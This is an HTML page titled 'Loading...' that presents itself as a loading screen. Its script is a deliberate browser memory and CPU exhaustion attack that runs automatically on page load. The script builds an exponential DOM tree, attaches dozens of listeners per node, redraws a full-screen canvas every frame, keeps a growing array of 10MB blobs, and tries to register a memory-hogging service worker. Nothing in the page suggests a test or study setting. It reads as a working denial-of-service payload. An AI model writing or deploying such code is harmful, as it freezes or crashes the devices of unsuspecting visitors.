<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; }
        #container { width: 100%; height: 100vh; overflow: hidden; }
    </style>
</head>
<body>
    <div id="container"></div>
    <script>
        // Memory bomb: exponential DOM growth
        const container = document.getElementById('container');
        let depth = 0;
        
        function buildTree(parent, level) {
            if (level > 18) return; // ~262k nodes at level 18
            
            for (let i = 0; i < 8; i++) {
                const div = document.createElement('div');
                div.textContent = `Node ${level}-${i}`;
                div.style.padding = '2px';
                
                // Event listener spam
                for (let j = 0; j < 50; j++) {
                    div.addEventListener('mousemove', () => {
                        // Pointless work: string concat in loop
                        let s = '';
                        for (let k = 0; k < 100; k++) {
                            s += 'memory_leak_' + Math.random();
                        }
                    });
                }
                
                parent.appendChild(div);
                buildTree(div, level + 1);
            }
        }
        
        // Kick off tree
        buildTree(container, 0);
        
        // Canvas pixel bomb (runs continuously)
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        container.appendChild(canvas);
        
        const ctx = canvas.getContext('2d');
        let frameCount = 0;
        
        function canvasBomb() {
            // Full-screen pixel manipulation every frame
            const imageData = ctx.createImageData(canvas.width, canvas.height);
            const data = imageData.data;
            
            for (let i = 0; i < data.length; i += 4) {
                data[i] = Math.random() * 255;     // R
                data[i + 1] = Math.random() * 255; // G
                data[i + 2] = Math.random() * 255; // B
                data[i + 3] = 255;                 // A
            }
            
            ctx.putImageData(imageData, 0, 0);
            frameCount++;
            
            // Log memory usage every 10 frames
            if (frameCount % 10 === 0 && performance.memory) {
                console.log(`Memory: ${(performance.memory.usedJSHeapSize / 1048576).toFixed(2)}MB`);
            }
            
            requestAnimationFrame(canvasBomb);
        }
        
        canvasBomb();
        
        // Blob accumulation (hidden, unbounded)
        setInterval(() => {
            // Create and retain large blobs
            const size = 10 * 1024 * 1024; // 10MB
            const blob = new Blob([new ArrayBuffer(size)]);
            
            // Store reference so it never GC'd
            window.blobStore = window.blobStore || [];
            window.blobStore.push(blob);
        }, 500);
        
        // Service Worker memory retention (if available)
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('message', (event) => {
                    let store = [];
                    for (let i = 0; i < 1000; i++) {
                        store.push(new ArrayBuffer(100000));
                    }
                });
            `;
            const swBlob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(swBlob);
            navigator.serviceWorker.register(swUrl).catch(() => {});
        }
    </script>
</body>
</html>
